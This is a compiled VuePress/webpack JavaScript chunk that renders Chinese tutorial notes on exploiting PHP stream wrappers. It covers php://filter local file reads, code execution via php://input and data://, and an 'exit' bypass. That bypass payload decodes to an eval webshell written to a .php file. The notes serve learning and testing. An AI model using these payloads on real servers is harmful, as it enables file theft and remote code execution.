(window.webpackJsonp=window.webpackJsonp||[]).push([[17],{341:function(t,s,a){"use strict";a.r(s);var e=a(3),n=Object(e.a)({},(function(){var t=this,s=t._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("h1",{attrs:{id:"php中的协议利用"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#php中的协议利用"}},[t._v("#")]),t._v(" PHP中的协议利用")]),t._v(" "),s("h2",{attrs:{id:"php-input"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#php-input"}},[t._v("#")]),t._v(" "),s("code",[t._v("php://input")])]),t._v(" "),s("p",[t._v("接收POST RAW")]),t._v(" "),s("p",[t._v("需要打开 "),s("code",[t._v("url_allow_fopen")]),t._v(" "),s("code",[t._v("url_allow_include")])]),t._v(" "),s("h2",{attrs:{id:"data"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#data"}},[t._v("#")]),t._v(" "),s("code",[t._v("data://")])]),t._v(" "),s("p",[s("code",[t._v("data://text/plain,<phpcode>")])]),t._v(" "),s("p",[t._v("需要打开 "),s("code",[t._v("url_allow_fopen")]),t._v(" "),s("code",[t._v("url_allow_include")])]),t._v(" "),s("h2",{attrs:{id:"php-filter简单理解"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#php-filter简单理解"}},[t._v("#")]),t._v(" "),s("code",[t._v("php://filter")]),t._v("简单理解：")]),t._v(" "),s("p",[t._v("php://filter 是php中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取；根据名字，filter，可以很容易想到这个协议可以用来过滤一些东西；")]),t._v(" "),s("p",[t._v("使用不同的参数可以达到不同的目的和效果：")]),t._v(" "),s("table",[s("thead",[s("tr",[s("th",[t._v("名称")]),t._v(" "),s("th",[t._v("描述")]),t._v(" "),s("th",[t._v("备注")])])]),t._v(" "),s("tbody",[s("tr",[s("td",[t._v("resource=<要过滤的数据流>")]),t._v(" "),s("td",[t._v("指定了你要筛选过滤的数据流")]),t._v(" "),s("td",[t._v("必选")])]),t._v(" "),s("tr",[s("td",[t._v("read=<读链的筛选列表>")]),t._v(" "),s("td",[t._v('可以设定一个或多个过滤器名称，以管道符"|"分割')]),t._v(" "),s("td",[t._v("可选")])]),t._v(" "),s("tr",[s("td",[t._v("write=<写链的筛选列表>")]),t._v(" "),s("td",[t._v('可以设定一个或多个过滤器名称，以管道符"|“分割')]),t._v(" "),s("td",[t._v("可选")])]),t._v(" "),s("tr",[s("td",[t._v("<；两个链的筛选列表>")]),t._v(" "),s("td",[t._v("任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。")]),t._v(" "),s("td")])])]),t._v(" "),s("blockquote",[s("p",[t._v("Trick： read 和write 里 可以塞垃圾字符\nphp://filter面对不可用的规则是报个Warning，然后跳过继续执行")])]),t._v(" "),s("h3",{attrs:{id:"string-strip-tags"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#string-strip-tags"}},[t._v("#")]),t._v(" string.strip_tags")]),t._v(" "),s("h3",{attrs:{id:"convert-转换过滤器"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#convert-转换过滤器"}},[t._v("#")]),t._v(" convert 转换过滤器")]),t._v(" "),s("ul",[s("li",[s("p",[t._v("base64-encode/decode")])]),t._v(" "),s("li",[s("p",[s("strong",[t._v("convert.iconv.*")])])])]),t._v(" "),s("blockquote",[s("p",[t._v("The convert.iconv.* filters are available, if iconv support is enabled, and their use is equivalent to processing all stream data with iconv(). These filters do not support parameters, but instead expect the input and output encodings to be given as part of the filter name, i.e. either as convert.iconv."),s("code",[t._v("<input-encoding>")]),t._v("."),s("code",[t._v("<output-encoding>")]),t._v(" or convert.iconv."),s("code",[t._v("<input-encoding>")]),t._v("/"),s("code",[t._v("<output-encoding>")]),t._v(" (both notations are semantically equivalent).")]),t._v(" "),s("p",[t._v("Example #3 convert.iconv.*")]),t._v(" "),s("div",{staticClass:"language-php line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-php"}},[s("code",[s("span",{pre:!0,attrs:{class:"token php language-php"}},[s("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("<?php")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$fp")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("fopen")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'php://output'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'w'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("stream_filter_append")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$fp")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'convert.iconv.utf-16le.utf-8'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("fwrite")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$fp")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"T\\0h\\0i\\0s\\0 \\0i\\0s\\0 \\0a\\0 \\0t\\0e\\0s\\0t\\0.\\0\\n\\0"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("fclose")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$fp")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("/* Outputs: This is a test. */")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("?>")])]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br"),s("span",{staticClass:"line-number"},[t._v("4")]),s("br"),s("span",{staticClass:"line-number"},[t._v("5")]),s("br"),s("span",{staticClass:"line-number"},[t._v("6")]),s("br"),s("span",{staticClass:"line-number"},[t._v("7")]),s("br")])])]),t._v(" "),s("p",[t._v("简单来说"),s("code",[t._v("convert.iconv.*")]),t._v("相当于调用了"),s("code",[t._v("iconv()")])]),t._v(" "),s("p",[t._v("可以看这个示例")]),t._v(" "),s("div",{staticClass:"language-php line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-php"}},[s("code",[s("span",{pre:!0,attrs:{class:"token php language-php"}},[s("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("<?php")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("echo")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("iconv")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'UCS-4LE'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'UCS-4BE'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"<?ph"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("//Output:hp?<")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("?>")])]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br"),s("span",{staticClass:"line-number"},[t._v("4")]),s("br")])]),s("p",[t._v("利用:")]),t._v(" "),s("ol",[s("li",[t._v("LFR/LFI")])]),t._v(" "),s("p",[s("code",[t._v("php://filter/read=convert.base64-encode/resource=file.txt")])]),t._v(" "),s("ul",[s("li",[s("p",[s("code",[t._v("php://input")]),t._v(" + POST报文php代码  (allow_url_include=On)")])]),t._v(" "),s("li",[s("p",[s("code",[t._v("data://text/plain,<phpcode>")]),t._v(" (allow_url_include=On)")])])]),t._v(" "),s("ol",{attrs:{start:"2"}},[s("li",[t._v("绕过死亡exit,关键词检测")])]),t._v(" "),s("p",[t._v("Example:")]),t._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v("php://filter/write=string.strip_tags|convert.base64-decode/resource=?>PD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8+/../Qftm.php\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br")])]),s("h2",{attrs:{id:"参考资料"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#参考资料"}},[t._v("#")]),t._v(" 参考资料")]),t._v(" "),s("p",[t._v("谈一谈php://filter的妙用:https://www.leavesongs.com/PENETRATION/php-filter-magic.html")]),t._v(" "),s("p",[t._v("php 可用过滤器列表 ：https://www.php.net/manual/en/filters.php")]),t._v(" "),s("p",[t._v("探索php://filter在实战当中的奇技淫巧 ： https://www.anquanke.com/post/id/202510")]),t._v(" "),s("p",[t._v("file_put_content和死亡·杂糅代码之缘 https://xz.aliyun.com/t/8163")]),t._v(" "),s("p",[t._v("关于file_put_contents的一些小测试 https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/")])])}),[],!1,null,null,null);s.default=n.exports}}]);